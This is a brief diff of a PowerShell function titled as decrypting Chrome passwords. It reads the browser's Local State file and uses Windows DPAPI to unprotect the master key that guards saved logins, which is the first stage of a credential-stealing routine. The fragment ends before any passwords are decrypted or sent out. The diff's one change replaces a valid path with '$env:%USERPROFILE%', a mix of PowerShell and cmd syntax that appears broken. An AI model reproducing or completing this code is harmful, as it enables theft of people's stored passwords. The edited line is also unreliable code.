@@ -1,7 +1,7 @@
 # Function to decrypt Chrome passwords
 function Get-ChromePasswords {
     try {
-        $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
+        $localStatePath = "$env:%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State"
         $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
         $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
         $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
